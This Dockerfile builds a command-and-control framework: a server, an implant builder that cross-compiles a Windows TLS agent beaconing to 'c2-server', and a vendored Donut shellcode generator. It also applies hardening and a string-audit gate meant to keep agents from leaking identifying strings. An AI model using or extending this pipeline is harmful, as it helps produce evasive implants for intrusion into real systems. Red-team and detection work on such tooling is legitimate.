# ── Stage 1: Build server, builder, and Linux client ─────────────────────────
# NIGHTLY IS MANDATORY: agent OPSEC hardening (-Zlocation-detail=none,
# -Ztrim-paths, -Zbuild-std + panic_immediate_abort) only exists on nightly,
# and the builder REFUSES to produce agents on stable (see src/bin/builder.rs,
# --allow-stable-leak). rust-src is required for the std rebuild.
FROM rustlang/rust:nightly-2026-08-22 AS build

RUN rustup component add rust-src --toolchain nightly-2026-08-22 \
 && rustup target add x86_64-pc-windows-gnu --toolchain nightly-2026-08-22 \
 && rustup target add x86_64-unknown-linux-musl --toolchain nightly-2026-08-22 \
 && apt-get update && apt-get install -y --no-install-recommends \
        mingw-w64 gcc-mingw-w64-x86-64 musl-tools osslsigncode \
    && rm -rf /var/lib/apt/lists/*

# IMPORTANT: do NOT set RUSTUP_TOOLCHAIN anywhere - it overrides
# rust-toolchain.toml and silently downgrades the build to stable.

# ── Donut shellcode generator (TheWover/donut, BSD-style) ──────────────
# Vendored at a pinned commit for reproducibility. Only the native
# generator is compiled: the reflective loader stubs ship prebuilt with
# the source (loader_exe_x64.h / loader_exe_x86.h), so no mingw loader
# rebuild is required. Used by the builder for `--format donut` and the
# `donut` pipeline stage. aplib64.a is donut's bundled compression lib.
# The chain is a hard gate: a broken clone or compile fails the image
# build here instead of surfacing later at the runtime-stage COPY.
ARG DONUT_COMMIT=47758d787209dd1744f58c140102ac91b649df16
RUN git clone -q https://github.com/TheWover/donut /opt/donut-src \
 && cd /opt/donut-src \
 && git checkout -q "$DONUT_COMMIT" \
 && gcc -Wunused-function -Wall -fpack-struct=8 -DDONUT_EXE -I include \
        donut.c hash.c encrypt.c format.c loader/clib.c lib/aplib64.a \
        -o /opt/donut \
 && test -x /opt/donut

WORKDIR /build
COPY . .

# cargo config no longer injects rustflags; the builder sets them per-invocation.
RUN cargo +nightly-2026-08-22 build --release --bin server --bin builder --bin client 2>&1

# ── Stage 2: Unit test gate ──────────────────────────────────────────────────
FROM build AS test
RUN cargo +nightly-2026-08-22 test --release --lib 2>&1

# ── Stage 3: Cross-compile Windows agents via the builder ───────────────────
# The builder detects nightly, injects -Zlocation-detail=none -Ztrim-paths
# -Zbuild-std=std,panic_abort -Zbuild-std-features=panic_immediate_abort and
# --cfg agent_build, and packs the config as a binary blob.
FROM build AS agents
RUN rm -f dist/exe_windows_* && \
    ./target/release/builder --host c2-server --port 4443 --transport tls \
        --platform windows --sleep 2 --jitter-min 0 --jitter-max 0 && \
    cp dist/exe_windows_*.exe /build/agent-tls.exe && \
    rm -f dist/exe_windows_* && \
    echo "[+] Windows TLS agent built"

# ── Stage 4: String-audit gate (fail the image if anything leaked) ───────────
FROM agents AS audit
RUN chmod +x tools/string_audit.sh && \
    ./tools/string_audit.sh /build/agent-tls.exe && \
    echo "[+] String audit passed"

# ── Stage 5: Runtime ─────────────────────────────────────────────────────────
FROM debian:trixie-slim AS runtime
# Runtime deps + everything needed to compile agents AT RUNTIME via the
# builder API (openssl-sys/ring need cc+headers; mingw for Windows agents).
RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates sqlite3 curl osslsigncode \
        build-essential pkg-config libssl-dev cmake \
        binutils gcc-mingw-w64-x86-64 musl-tools \
        libxcb1-dev libxcb-shm0-dev libxcb-randr0-dev \
        libxcb-shape0-dev libxcb-xfixes0-dev libx11-dev libxrandr-dev \
    && rm -rf /var/lib/apt/lists/*

# Full Rust toolchain in the final image. Without it, the builder API fails
# with "Cannot execute cargo binary". The toolchain dir carries nightly +
# rust-src from the build stage; the builder pins RUSTUP_TOOLCHAIN=nightly on
# spawned builds itself, so no env override is needed here.
COPY --from=build /usr/local/cargo /usr/local/cargo
COPY --from=build /usr/local/rustup /usr/local/rustup
ENV PATH="/usr/local/cargo/bin:${PATH}" \
    CARGO_HOME=/usr/local/cargo \
    RUSTUP_HOME=/usr/local/rustup

WORKDIR /opt/rcm
COPY --from=audit /build/target/release/server  /opt/rcm/server
COPY --from=audit /build/target/release/builder /opt/rcm/builder
COPY --from=audit /build/target/release/client  /opt/rcm/client_linux
COPY --from=audit /build/agent-tls.exe          /opt/rcm/agent-tls.exe
# Donut generator (built in stage 1) for `--format donut` / donut pipelines.
COPY --from=build /opt/donut                    /opt/rcm/donut
COPY panel/ /opt/rcm/panel/
COPY extensions/ /opt/rcm/extensions/
COPY modules/ /opt/rcm/modules/
COPY traffic_profiles/ /opt/rcm/traffic_profiles/
COPY fallback_profiles/ /opt/rcm/fallback_profiles/
COPY config.example.toml /opt/rcm/config.example.toml

# Source tree for runtime agent builds (project root = /app, the compose
# working_dir). Kept minimal: no target/, no dist/, no logs/.
COPY Cargo.toml Cargo.lock* build.rs rust-toolchain.toml /app/
COPY src/ /app/src/
COPY strcrypt/ /app/strcrypt/
COPY client_dll/ /app/client_dll/
COPY assets/ /app/assets/
# PIC C template for `--format pic_c` (default --pic-src).
COPY templates/ /app/templates/
COPY .cargo/ /app/.cargo/
COPY gen_certs.sh /opt/rcm/gen_certs.sh
RUN chmod +x /opt/rcm/server /opt/rcm/builder /opt/rcm/gen_certs.sh
EXPOSE 4443 8080
ENTRYPOINT ["/opt/rcm/server"]
